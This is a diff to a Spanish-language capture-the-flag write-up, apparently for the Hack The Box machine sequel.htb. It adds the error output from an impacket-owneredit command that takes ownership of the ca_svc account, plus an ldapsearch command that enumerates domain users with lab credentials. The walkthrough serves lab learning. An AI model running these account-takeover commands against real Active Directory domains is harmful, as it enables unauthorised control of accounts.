@@ -674,8 +674,17 @@ Como primer paso para su explotación otorge la propiedad:
 ```bash
 impacket-owneredit -action write -new-owner 'ryan' -target-dn 'CN=ca_svc,CN=Users,DC=sequel,DC=htb' sequel.htb/ryan:'WqSZAF6CysDQbGb3'  -dc-ip 10.10.11.51
 ```
-
 Mi comando anterior obtuvo un error indicando que no podía encontrar a **ca_svc** en LDAP así que enumeré los usuarios con ldapsearch para saber el Distinguished Name (DN) correcto
+
+```bash
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] Target principal not found in LDAP (CN=ca_svc,CN=Users,DC=sequel,DC=htb)
+```
+```bash
+ldapsearch -x -H ldap://10.10.11.51 -D "ryan@sequel.htb" -w 'WqSZAF6CysDQbGb3' -b "DC=sequel,DC=htb" "(&(objectCategory=person)(objectClass=user))"
+```
+
 
 Por ultimo cambie la contraseña del usuario `ca_svc`
 
